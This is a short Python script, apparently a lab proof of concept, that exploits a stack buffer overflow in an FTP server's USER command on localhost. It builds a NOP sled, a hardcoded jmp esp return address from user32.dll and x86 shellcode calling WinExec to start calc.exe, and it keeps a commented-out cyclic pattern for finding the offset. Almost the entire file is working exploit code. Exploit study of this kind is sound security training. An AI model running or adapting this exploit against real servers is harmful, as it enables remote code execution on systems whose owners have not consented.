# coding:utf-8

import socket
import os

def ftpSend(s):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect(('127.0.0.1',21))
    sock.send(b'USER '+s+b'\r\n')
    sock.send(b'PASS 123456\r\n')
    #sock.close()

#s = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae'
#ftpSend(s)

shellcode = b"\x33\xc0"                           # XOR EAX,EAX
shellcode += b"\x50"                              # PUSH EAX      => padding for lpCmdLine
shellcode += b"\x68\x2E\x65\x78\x65"              # PUSH ".exe"
shellcode += b"\x68\x63\x61\x6C\x63"              # PUSH "calc"
shellcode += b"\x8B\xC4"                          # MOV EAX,ESP
shellcode += b"\x6A\x01"                          # PUSH 1
shellcode += b"\x50"                              # PUSH EAX
shellcode += b"\xBB\xAD\x23\x86\x7C"              # MOV EBX,kernel32.WinExec
shellcode += b"\xFF\xD3"                          # CALL EBX

nop = b'\x90'* 485
jmpesp = b'\x79\x5b\xe3\x77'                      # jump esp 地址，从user32.dll获取到

p = nop+jmpesp+b'\x90'*12+shellcode+b'\x90'*12

ftpSend(p)

